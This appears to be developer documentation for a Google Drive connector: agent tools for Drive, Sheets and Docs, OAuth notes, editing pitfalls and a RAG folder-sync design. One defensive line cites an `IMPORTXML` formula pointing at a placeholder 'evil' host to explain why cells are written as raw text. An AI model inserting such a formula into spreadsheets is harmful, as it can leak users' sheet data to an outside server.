# Google Drive Connector

Two surfaces, two runtimes:

| Surface | Runtime | Auth |
| ------- | ------- | ---- |
| Agent-loop tools | First-class port (`apps/api/src/yomi/connectors/drive.py`) | OAuth 2.0, `https://www.googleapis.com/auth/drive` |
| RAG auto-sync sources | Composio `googledrive` toolkit (`apps/api/src/yomi/services/rag/drive.py`) | Composio connection for connector `google-drive` |

The `drive` scope also authorizes the **Slides**, **Sheets**, and **Docs** APIs
— no extra consent. But each of those APIs must be separately **enabled** in the
Cloud project or every call 403s with a valid token. Scope ≠ API enablement.

## Agent-loop tools

Auth: OAuth 2.0 with `https://www.googleapis.com/auth/drive` and
`userinfo.email`.

## Tools

| Tool                     | Type               | Purpose                                                                                                                                                                   |
| ------------------------ | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `drive-getStorageQuota`  | Read               | Report Drive usage, limit, free space, and percentage used.                                                                                                               |
| `drive-searchFiles`      | Read               | Search files with Drive query syntax.                                                                                                                                     |
| `drive-listFiles`        | Read               | List recent files globally or in a folder.                                                                                                                                |
| `drive-getFile`          | Read               | Get metadata for one file.                                                                                                                                                |
| `drive-readFile`         | Read               | Export/read text from Docs, Sheets, Slides, text, CSV, JSON, and markdown files.                                                                                          |
| `drive-listPermissions`  | Read               | List permissions on a file.                                                                                                                                               |
| `drive-createFile`       | Write              | Create a Google Doc (Markdown → formatted), Sheet (CSV/TSV → grid), Slides (Markdown → multi-slide deck), Drawing, Apps Script, Form, Site, or Jamboard via `kind` param. |
| `drive-createFolder`     | Write              | Create a folder with optional parent.                                                                                                                                     |
| `drive-updateFile`       | Write              | Rename and/or move a file.                                                                                                                                                |
| `drive-deleteFile`       | Write/Irreversible | Trash or permanently delete a file.                                                                                                                                       |
| `drive-shareFile`        | Write              | Share with user/group or create a shareable link.                                                                                                                         |
| `drive-copyFile`         | Write              | Copy a file.                                                                                                                                                              |
| `drive-convertFile`      | Write              | Convert a Google Doc to PDF or other format.                                                                                                                              |
| `drive-listSheetTabs`    | Read               | List a spreadsheet's tabs with row/column counts — call before reading a range.                                                                                           |
| `drive-readSheet`        | Read               | Read cell values from an A1 range ("what's in my budget sheet").                                                                                                          |
| `drive-appendSheetRows`  | Write              | Append rows below existing data — never overwrites ("add this expense").                                                                                                  |
| `drive-updateSheetRange` | Write              | Overwrite a specific A1 range. Destructive.                                                                                                                               |
| `drive-appendToDoc`      | Write              | Append plain text to the end of an existing Doc.                                                                                                                          |
| `drive-replaceInDoc`     | Write              | Find and replace every occurrence in an existing Doc.                                                                                                                     |

## Notes

Binary files return metadata and links instead of content. Permanent deletion
must be treated as irreversible and explicitly confirmed. All write operations
use `gateWrite`.

## Sheets and Docs editing gotchas

- **Always `RAW`, never `USER_ENTERED`.** Agent-supplied content is untrusted,
  and `USER_ENTERED` would evaluate a cell like `=IMPORTXML("http://evil/", …)`
  as a live formula (CSV/formula injection). `RAW` stores every string
  literally. `coerceCell()` still converts plain numbers to real numbers, while
  a strict pattern keeps leading-zero strings (IDs, zip codes, phone numbers) as
  text.
- **Docs has no append.** You insert at an index. The body's final position is
  the newline that closes it, so text must go at `endIndex - 1` — inserting at
  `endIndex` is rejected. `drive-appendToDoc` reads `body.content` to find it.
- **Append vs overwrite is a real distinction.** `drive-appendSheetRows` uses
  `:append` with `INSERT_ROWS`, so Google finds the first empty row itself and
  nothing is clobbered. `drive-updateSheetRange` is the destructive one; the
  tool descriptions steer the model between them.
- Tab names with spaces or quotes must be single-quoted in an A1 reference, with
  `''` escaping a literal quote — `a1()` handles this.

## RAG auto-sync (drive sources)

Full design: [ADR-0007](../../adr/0007-google-drive-auto-sync-rag-r2.md).
Runtime: `apps/api/src/yomi/services/rag/drive.py`. Sync runs through the
Composio `googledrive` toolkit (`GOOGLEDRIVE_LIST_FILES`,
`GOOGLEDRIVE_GET_CHANGES_START_PAGE_TOKEN`, `GOOGLEDRIVE_LIST_CHANGES`,
`GOOGLEDRIVE_PARSE_FILE`); content is staged through the storage Worker into
Cloudflare R2 (`ingest/put|read|delete`) — the container never calls Amazon S3.

- **Source model.** One `rag_sources` row per `(userId, folderId)` (folder id in
  `path`, name in `name`, `sourceType = 'google-drive'`, `privacyScope =
  'cloud_rag'`). Status machine `backfilling → active`; deleting the source
  deletes its docs and chunks. v1 indexes **direct children only** (batch 20,
  max 1000 children, sync caps at 5 change pages per tick).
- **Indexable content** (per [Indexable
  export](../../../CONTEXT.md)): Docs/Slides → `text/plain`, Sheets → `text/csv`,
  native `txt`/`md`/`csv`/`tsv`/`html`/`xml`/`json` → `text/plain`. PDFs,
  images, and other binaries are counted as skipped, never fatal.
- **Lifecycle.** `backfill` lists and ingests until drained → `active`; then
  `sync` applies the Drive Changes API from the persisted `startPageToken` and
  removes trashed/moved-out docs. `sync` on a non-active source returns
  `409 backfill_pending`. A cron sweep (`POST /internal/rag/drive-sync`, 5
  sources per turn) catches sources up without user action.
- **Enabling.** Connect `google-drive` in Chats/Integrations (Composio). The
  sync uses only that existing connection — no extra OAuth consent. Then
  `POST /api/rag/drive/sources {folderId, name}` → `backfill` → `sync`.
- **Known quirk.** `GOOGLEDRIVE_PARSE_FILE` resolves only file ids listed
  earlier in the same Composio session, so every tick lists before it parses
  (backfill re-lists during its walk; sync warms the folder once per tick).
